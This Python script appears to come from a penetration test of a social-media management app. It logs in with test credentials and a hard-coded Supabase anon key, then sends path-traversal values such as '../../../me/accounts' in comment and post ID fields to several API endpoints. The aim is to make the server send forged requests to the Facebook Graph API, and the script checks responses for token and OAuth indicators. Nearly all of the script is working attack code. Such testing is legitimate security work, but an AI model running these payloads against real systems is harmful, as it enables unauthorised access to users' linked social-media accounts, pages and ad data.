#!/usr/bin/env python3
"""
SSRF vulnerability testing script for SSRF-VULN-02 through SSRF-VULN-06.
Tests path traversal in commentId, postId, and platform_post_id parameters
to confirm server-side requests to graph.facebook.com.
"""

import json
import urllib.parse
import requests

# Configuration
SUPABASE_URL = "https://txomrdymcawauezlprvn.supabase.co"
ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR4b21yZHltY2F3YXVlemxwcnZuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMTA0MjgsImV4cCI6MjA4MzY4NjQyOH0.dwBcXZ_TZG97GCCvPPtfKETbxnm4jNFSF1K1FwFut0E"
APP_URL = "http://host.docker.internal:3000"
EMAIL = "ssrf_test_3d1fa59c@pentest.local"
PASSWORD = "PentestPassword123!@#"
WORKSPACE_ID = "5ecf3626-b4c0-41af-8e56-fdcdba3b6e48"
ACCOUNT_ID = "4090e3f5-3631-4d52-893c-c74c900f1201"


def log_response(label, url, method, req_body, resp):
    """Log complete request and response details."""
    print("\n" + "=" * 80)
    print(f"TEST: {label}")
    print("=" * 80)
    print(f"Method : {method}")
    print(f"URL    : {url}")
    if req_body:
        print(f"Body   : {json.dumps(req_body, indent=2)}")
    print(f"\nStatus : {resp.status_code}")
    print("Response Headers:")
    for k, v in resp.headers.items():
        print(f"  {k}: {v}")
    print("\nResponse Body:")
    try:
        body = resp.json()
        print(json.dumps(body, indent=2))
    except Exception:
        print(resp.text[:4000])

    # Check for SSRF indicators
    indicators = ["OAuthException", "graphCode", "fbtraceId", "graph.facebook.com",
                  "access_token", "GraphAPIError", "Invalid OAuth"]
    found = [i for i in indicators if i.lower() in resp.text.lower()]
    if found:
        print(f"\n*** SSRF CONFIRMED: Found indicators: {found} ***")
    print("=" * 80)


def step1_get_token():
    """Step 1: Authenticate and get access token."""
    print("\n[STEP 1] Getting access token...")
    url = f"{SUPABASE_URL}/auth/v1/token?grant_type=password"
    headers = {
        "apikey": ANON_KEY,
        "Content-Type": "application/json"
    }
    body = {"email": EMAIL, "password": PASSWORD}
    resp = requests.post(url, headers=headers, json=body, timeout=30)
    print(f"Auth status: {resp.status_code}")
    data = resp.json()
    if "access_token" not in data:
        raise RuntimeError(f"Auth failed: {data}")
    print(f"Got access_token (truncated): {data['access_token'][:40]}...")
    return data


def step2_build_session(token_data):
    """Step 2: Set up session with auth cookie."""
    print("\n[STEP 2] Building session with auth cookies...")
    session = requests.Session()

    cookie_value = urllib.parse.quote(json.dumps(token_data))
    session.cookies.set(
        "sb-txomrdymcawauezlprvn-auth-token",
        cookie_value,
        domain="host.docker.internal"
    )
    session.cookies.set(
        "active_workspace_id",
        WORKSPACE_ID,
        domain="host.docker.internal"
    )
    print("Session configured.")
    return session


def step3_ssrf_vuln_04(session):
    """Step 3: Test SSRF-VULN-04 via POST /api/posts-media/comments."""
    url = f"{APP_URL}/api/posts-media/comments"
    traversals = [
        "../../../me/accounts",
        "../../me",
        "../../../../me/accounts",
    ]
    for comment_id in traversals:
        body = {
            "commentId": comment_id,
            "message": "test reply",
            "platform": "instagram",
            "accountId": ACCOUNT_ID
        }
        resp = session.post(url, json=body, timeout=30)
        log_response(
            f"SSRF-VULN-04 POST /api/posts-media/comments commentId={comment_id}",
            url, "POST", body, resp
        )


def step4_ssrf_vuln_05(session):
    """Step 4: Test SSRF-VULN-05 via DELETE /api/posts-media/comments."""
    traversals = [
        "../../../me/accounts",
        "../../me",
    ]
    for comment_id in traversals:
        params = {
            "commentId": comment_id,
            "platform": "instagram",
            "accountId": ACCOUNT_ID
        }
        url = f"{APP_URL}/api/posts-media/comments"
        resp = session.delete(url, params=params, timeout=30)
        log_response(
            f"SSRF-VULN-05 DELETE /api/posts-media/comments commentId={comment_id}",
            resp.url, "DELETE", None, resp
        )


def step5_ssrf_vuln_06(session):
    """Step 5: Test SSRF-VULN-06 via PATCH /api/posts-media/comments."""
    url = f"{APP_URL}/api/posts-media/comments"
    traversals = [
        "../../../me/accounts",
        "../../me",
    ]
    for comment_id in traversals:
        body = {
            "commentId": comment_id,
            "hidden": True,
            "platform": "instagram",
            "accountId": ACCOUNT_ID
        }
        resp = session.patch(url, json=body, timeout=30)
        log_response(
            f"SSRF-VULN-06 PATCH /api/posts-media/comments commentId={comment_id}",
            url, "PATCH", body, resp
        )


def step6_ssrf_vuln_03(session):
    """Step 6: Test SSRF-VULN-03 via GET /api/posts-media/comments with path traversal postIds."""
    traversals = [
        "../../../me/accounts",
        "../../../me/adaccounts",
        "../../../me/pages",
    ]
    url = f"{APP_URL}/api/posts-media/comments"
    for post_id in traversals:
        params = {
            "postId": post_id,
            "platform": "instagram"
        }
        resp = session.get(url, params=params, timeout=30)
        log_response(
            f"SSRF-VULN-03 GET /api/posts-media/comments postId={post_id}",
            resp.url, "GET", None, resp
        )


def step7_ssrf_vuln_02(session):
    """Step 7: Test SSRF-VULN-02 via POST automation with platform_post_id traversal."""
    url = f"{APP_URL}/api/automation/run"
    traversals = [
        "../../../me",
        "../../me",
        "../../../me/accounts",
    ]
    for post_id in traversals:
        body = {
            "platform_post_id": post_id,
            "platform": "instagram",
            "accountId": ACCOUNT_ID,
            "workspaceId": WORKSPACE_ID
        }
        resp = session.post(url, json=body, timeout=30)
        log_response(
            f"SSRF-VULN-02 POST /api/automation/run platform_post_id={post_id}",
            url, "POST", body, resp
        )

    # Also try the social-listening or schedule endpoints that may use platform_post_id
    alt_urls = [
        f"{APP_URL}/api/social/posts",
        f"{APP_URL}/api/posts",
        f"{APP_URL}/api/schedule",
    ]
    for alt_url in alt_urls:
        body = {
            "platform_post_id": "../../../me",
            "platform": "instagram",
            "accountId": ACCOUNT_ID
        }
        try:
            resp = session.post(alt_url, json=body, timeout=10)
            log_response(
                f"SSRF-VULN-02 (alt) POST {alt_url} platform_post_id=../../../me",
                alt_url, "POST", body, resp
            )
        except Exception as e:
            print(f"[SKIP] {alt_url}: {e}")


def main():
    print("=" * 80)
    print("SSRF VULNERABILITY TEST SUITE: VULN-02 through VULN-06")
    print("=" * 80)

    token_data = step1_get_token()
    session = step2_build_session(token_data)

    step3_ssrf_vuln_04(session)
    step4_ssrf_vuln_05(session)
    step5_ssrf_vuln_06(session)
    step6_ssrf_vuln_03(session)
    step7_ssrf_vuln_02(session)

    print("\n[DONE] All SSRF tests completed.")


if __name__ == "__main__":
    main()
